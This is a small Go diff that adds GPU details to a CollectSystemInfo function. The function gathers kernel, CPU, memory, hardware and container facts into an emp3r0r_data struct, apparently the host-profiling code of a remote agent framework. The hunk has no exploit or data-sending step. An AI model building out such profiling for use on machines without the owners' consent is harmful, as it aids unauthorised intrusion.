@@ -89,6 +89,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	info.Kernel = util.GetKernelVersion()
 	info.Arch = runtime.GOARCH
 	info.CPU = util.GetCPUInfo()
+	info.GPU = util.GetGPUInfo()
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
 	info.Hardware = util.CheckProduct()
 	info.Container = CheckContainer()
